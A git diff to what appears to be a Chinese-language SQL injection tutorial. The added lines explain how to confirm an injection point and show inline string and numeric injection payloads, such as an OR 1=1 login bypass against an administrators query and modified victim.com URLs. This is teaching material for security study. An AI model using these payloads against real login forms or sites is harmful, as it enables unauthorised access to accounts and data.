@@ -101,3 +101,16 @@ SQL语句发生错误时通常引起HTTP 500错误码。有时也会被HTTP 302�
 应答的数据量大小区别也能作为一种错误码，甚至于微小的变化都可能代表有可以利用的机会。其他的变化也可以当做指示器，例如是否显示产品标识、是否有用户数据出现。
 盲注正是利用这种细微差别来识别并最终利用注入漏洞。
 
+确认漏洞的存在
+需要构造有效的SQL语句来确认注入点。这个有效的SQL语句必须可执行。
+首先区分数据库中数据类型，分为两类，一类是数字，不需要单引号；另一类是其他类型，需要单引号。
+inline injection
+在原语句中插入一些内容，插入后整个语句仍然会全部执行。
+原语句：SELECT * FROM administrators WHERE username = ''' AND password = '';
+修改后语句：SELECT * FROM administrators WHERE username = '' OR 1=1 OR '1'='1' AND password = '';
+SELECT * FROM administrators WHERE username = 'admin' AND 1=1 OR '1'='1' AND password = '';
+
+inline numeric value injection
+原URL：http://www.victim.com/messages/list.aspx?uid=45
+修改后URL：http://www.victim.com/messages/list.aspx?uid=0 having 1=1
+http://www.victim.com/messages/list.aspx?uid=45 or 1=1
